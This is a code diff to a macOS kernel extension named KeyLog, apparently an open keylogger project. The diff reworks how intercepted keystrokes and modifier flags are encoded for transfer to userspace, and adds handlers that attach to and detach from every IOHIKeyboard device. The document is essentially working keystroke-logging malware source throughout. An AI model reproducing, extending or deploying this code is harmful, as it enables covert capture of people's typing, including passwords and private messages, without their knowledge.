@@ -3,9 +3,9 @@
 #include <IOKit/IOLib.h>
 #include "KeyLog.h"
 
-com_prebeg_kext_KeyLog           *logService;
-KeyboardEventAction                     origAction;
-KeyboardSpecialEventAction      origSpecialAction;
+com_prebeg_kext_KeyLog		*logService;
+KeyboardEventAction         origAction;
+KeyboardSpecialEventAction	origSpecialAction;
 
 // This required macro defines the class's constructors, destructors,
 // and several other methods I/O Kit requires.
@@ -51,16 +51,65 @@ void logAction(OSObject * target,
 void com_prebeg_kext_KeyLog::logStroke( unsigned key, unsigned flags, unsigned charCode )
 {
     
-#ifdef DEBUG
-    IOLog( "%s::Copying key %04x\n", getName(), key );
-#endif
+    /*  changed to allow for dynamic key mappings:
+     - Keys are transmitted to userspace as 2 byte half-words
+     - The top 5 bits of the half-word indicate the flags
+     the order from high to low is:
+     case (Shift or Caps)
+     ctrl
+     alt
+     cmd
+     fn
+     - The bottom 11 bits contain the key itself (2048 is plenty big)
+     */
     
+    u_int16_t keyData = key;
+    keyData &= 0x07ff;                      // clear the top 5 bits
+    
+    if ((flags & CAPS_FLAG)||(flags & SHIFT_FLAG))
+        keyData |= 0x8000;
+    
+    if (flags & CTRL_FLAG)
+        keyData |= 0x4000;
+    
+    if (flags & ALT_FLAG)
+        keyData |= 0x2000;
+    
+    if (flags & CMD_FLAG)
+        keyData |= 0x1000;
+    
+    if (flags & FN_FLAG)
+        keyData |= 0x0800;
+    
+#ifdef DEBUG
+    IOLog( "%s::key [%c] (%04x)\n", getName(), keyData, keyData );
+#endif
+
+    /*
+    if (!buffsize)
+        bzero(fMemBuf,MAX_BUFF_SIZE);
+
+    memcpy(fMemBuf+buffsize,&keyData,sizeof(keyData));
+    buffsize+=sizeof(keyData);
+    
+    if (buffsize>(9*MAX_BUFF_SIZE/10))
+    {
+#ifdef DEBUG
+        IOLog( "%s::Error: buffer overflow\n", getName() );
+#endif
+        
+        buffsize=0;
+    }
+    */
 }
+
+/* INHERITED */
 
 bool com_prebeg_kext_KeyLog::init(OSDictionary *dict)
 {
+    IOLog("%s::%s\n", "com_prebeg_kext_KeyLog", __FUNCTION__);
+
     bool result = super::init(dict);
-    IOLog("Initializing\n");
     
     origAction = NULL;
     origSpecialAction = NULL;
@@ -68,6 +117,9 @@ bool com_prebeg_kext_KeyLog::init(OSDictionary *dict)
     kextKeys = 0;
     logService = this;
     
+	notify = NULL;
+	notifyTerm = NULL;
+
     loggedKeyboards = new OSArray();
     loggedKeyboards->initWithCapacity(1);
     
@@ -76,16 +128,40 @@ bool com_prebeg_kext_KeyLog::init(OSDictionary *dict)
 
 void com_prebeg_kext_KeyLog::free(void)
 {
-    IOLog("Freeing\n");
+    IOLog("%s::%s\n", getName(), __FUNCTION__);
+
     super::free();
 }
 
-IOService *com_prebeg_kext_KeyLog::probe(IOService *provider,
-                                                SInt32 *score)
+IOService *com_prebeg_kext_KeyLog::probe(IOService *provider, SInt32 *score)
 {
+    IOLog("%s::%s\n", getName(), __FUNCTION__);
+    
     IOService *result = super::probe(provider, score);
-    IOLog("Probing\n");
     return result;
+}
+
+bool com_prebeg_kext_KeyLog::terminationHandler(void *target, void *ref, IOService *newServ, IONotifier *notifier)
+{
+	com_prebeg_kext_KeyLog* self = OSDynamicCast(com_prebeg_kext_KeyLog, (OSMetaClassBase*)target );
+	if (!self)
+		return false;
+
+	if (!self->loggedKeyboards)
+		return false;
+	
+	IOHIKeyboard* keyboard = OSDynamicCast( IOHIKeyboard, newServ);
+	if (!keyboard)
+		return false;
+
+	int index = self->loggedKeyboards->getNextIndexOfObject(keyboard, 0);
+	if (index>=0)
+	{
+		self->kextKeys--;
+		self->loggedKeyboards->removeObject(index);
+	}
+
+	return true;
 }
 
 bool com_prebeg_kext_KeyLog::notificationHandler(void *target, void *ref, IOService *newServ, IONotifier *notifier)
@@ -125,7 +201,7 @@ bool com_prebeg_kext_KeyLog::notificationHandler(void *target, void *ref, IOServ
 
     // we have a valid keyboard to be logged
 #ifdef DEBUG
-    IOLog( "%s::Adding keyboard %x\n", self->getName(),keyboard );
+    IOLog( "%s::Adding keyboard %p\n", self->getName(),keyboard );
 #endif
     
     
@@ -172,19 +248,62 @@ void com_prebeg_kext_KeyLog::clearKeyboards()
     kextKeys=0;
 }
 
+void com_prebeg_kext_KeyLog::activate()
+{
+    IOLog("%s::%s\n", getName(), __FUNCTION__);
+   
+	notifyTerm = addMatchingNotification(gIOTerminatedNotification, serviceMatching("IOHIKeyboard"), (IOServiceMatchingNotificationHandler)&com_prebeg_kext_KeyLog::terminationHandler, this);
+
+	return;
+}
+
+void com_prebeg_kext_KeyLog::deactivate()
+{
+    IOLog("%s::%s\n", getName(), __FUNCTION__);
+
+    if (notify)
+		notify->remove();
+	notify = NULL;
+
+	clearKeyboards();
+
+	return;
+}
+
 bool com_prebeg_kext_KeyLog::start(IOService *provider)
 {
+    IOLog("%s::%s\n", getName(), __FUNCTION__);
+
     bool result = super::start(provider);
-    IOLog("Starting\n");
     
-    addMatchingNotification(gIOPublishNotification, serviceMatching("IOHIKeyboard"), (IOServiceMatchingNotificationHandler)&com_prebeg_kext_KeyLog::notificationHandler, this);
-    
+	registerService();
+
+    notify = addMatchingNotification(gIOPublishNotification, serviceMatching("IOHIKeyboard"), (IOServiceMatchingNotificationHandler)&com_prebeg_kext_KeyLog::notificationHandler, this);
+
+	activate();
+
+	if (!result)
+	{
+		stop(provider);
+		return false;
+	}
+
     return result;
 }
 
 void com_prebeg_kext_KeyLog::stop(IOService *provider)
 {
-    IOLog("Stopping\n");
+    IOLog("%s::%s\n", getName(), __FUNCTION__);
+		
+	if (notifyTerm)
+		notifyTerm->remove();
+
+    logService = NULL;
+
+	deactivate();
+
+	loggedKeyboards->release();
+
     super::stop(provider);
 }
 
